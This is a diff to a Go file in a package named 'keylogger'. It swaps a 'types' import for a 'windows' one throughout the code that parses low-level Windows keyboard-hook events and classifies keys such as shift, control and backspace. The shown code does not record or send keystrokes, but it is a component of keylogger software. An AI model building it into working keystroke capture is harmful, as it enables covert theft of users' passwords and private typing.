@@ -3,22 +3,22 @@ package keylogger
 import (
 	"unsafe"
 
-	"github.com/Spriithy/gkl/client/types"
+	"github.com/Spriithy/gkl/client/windows"
 )
 
 type KeyboardEvent struct {
-	WParam     types.WPARAM
-	LParam     types.LPARAM
-	Layout     types.HKL
-	HookStruct *types.KBDLLHOOKSTRUCT
+	WParam     windows.WPARAM
+	LParam     windows.LPARAM
+	Layout     windows.HKL
+	HookStruct *windows.KBDLLHOOKSTRUCT
 }
 
-func newKeyboardEvent(wParam types.WPARAM, lParam types.LPARAM, layout types.HKL) *KeyboardEvent {
+func newKeyboardEvent(wParam windows.WPARAM, lParam windows.LPARAM, layout windows.HKL) *KeyboardEvent {
 	return &KeyboardEvent{
 		WParam:     wParam,
 		LParam:     lParam,
 		Layout:     layout,
-		HookStruct: (*types.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam)),
+		HookStruct: (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam)),
 	}
 }
 
@@ -31,65 +31,65 @@ func (ke *KeyboardEvent) isDown() bool {
 }
 
 func (ke *KeyboardEvent) isKeyUp() bool {
-	return ke.WParam == types.WM_KEYUP
+	return ke.WParam == windows.WM_KEYUP
 }
 
 func (ke *KeyboardEvent) isKeyDown() bool {
-	return ke.WParam == types.WM_KEYDOWN
+	return ke.WParam == windows.WM_KEYDOWN
 }
 
 func (ke *KeyboardEvent) isSysKeyUp() bool {
-	return ke.WParam == types.WM_SYSKEYUP
+	return ke.WParam == windows.WM_SYSKEYUP
 }
 
 func (ke *KeyboardEvent) isSysKeyDown() bool {
-	return ke.WParam == types.WM_SYSKEYDOWN
+	return ke.WParam == windows.WM_SYSKEYDOWN
 }
 
-func (ke *KeyboardEvent) isMode(mode types.WPARAM) bool {
+func (ke *KeyboardEvent) isMode(mode windows.WPARAM) bool {
 	return ke.WParam == mode
 }
 
-func (ke *KeyboardEvent) isVk(vkCode types.DWORD) bool {
+func (ke *KeyboardEvent) isVk(vkCode windows.DWORD) bool {
 	return ke.HookStruct.VkCode == vkCode
 }
 
-func (ke *KeyboardEvent) isVkMode(vkCode types.DWORD, mode types.WPARAM) bool {
+func (ke *KeyboardEvent) isVkMode(vkCode windows.DWORD, mode windows.WPARAM) bool {
 	return ke.isMode(mode) && ke.isVk(vkCode)
 }
 
 func (ke *KeyboardEvent) isShift() bool {
-	return ke.isVk(types.VK_SHIFT) || ke.isVk(types.VK_LSHIFT) || ke.isVk(types.VK_RSHIFT)
+	return ke.isVk(windows.VK_SHIFT) || ke.isVk(windows.VK_LSHIFT) || ke.isVk(windows.VK_RSHIFT)
 }
 
 func (ke *KeyboardEvent) isCaps() bool {
-	return ke.isVk(types.VK_CAPITAL)
+	return ke.isVk(windows.VK_CAPITAL)
 }
 
 func (ke *KeyboardEvent) isReturn() bool {
-	return ke.isVk(types.VK_RETURN)
+	return ke.isVk(windows.VK_RETURN)
 }
 
 func (ke *KeyboardEvent) isBackspace() bool {
-	return ke.isVk(types.VK_BACK)
+	return ke.isVk(windows.VK_BACK)
 }
 
 func (ke *KeyboardEvent) isControl() bool {
-	return ke.isVk(types.VK_CONTROL) || ke.isVk(types.VK_LCONTROL) || ke.isVk(types.VK_RCONTROL)
+	return ke.isVk(windows.VK_CONTROL) || ke.isVk(windows.VK_LCONTROL) || ke.isVk(windows.VK_RCONTROL)
 }
 
 func (ke *KeyboardEvent) isMenu() bool {
-	return ke.isVk(types.VK_MENU) || ke.isVk(types.VK_LMENU) || ke.isVk(types.VK_RMENU)
+	return ke.isVk(windows.VK_MENU) || ke.isVk(windows.VK_LMENU) || ke.isVk(windows.VK_RMENU)
 }
 
 func (ke *KeyboardEvent) isEscape() bool {
-	return ke.isVk(types.VK_ESCAPE)
+	return ke.isVk(windows.VK_ESCAPE)
 }
 
 func (ke *KeyboardEvent) isTab() bool {
-	return ke.isVk(types.VK_TAB)
+	return ke.isVk(windows.VK_TAB)
 }
 
 func (ke *KeyboardEvent) isNumLock() bool {
-	return ke.isVk(types.VK_NUMLOCK)
+	return ke.isVk(windows.VK_NUMLOCK)
 }
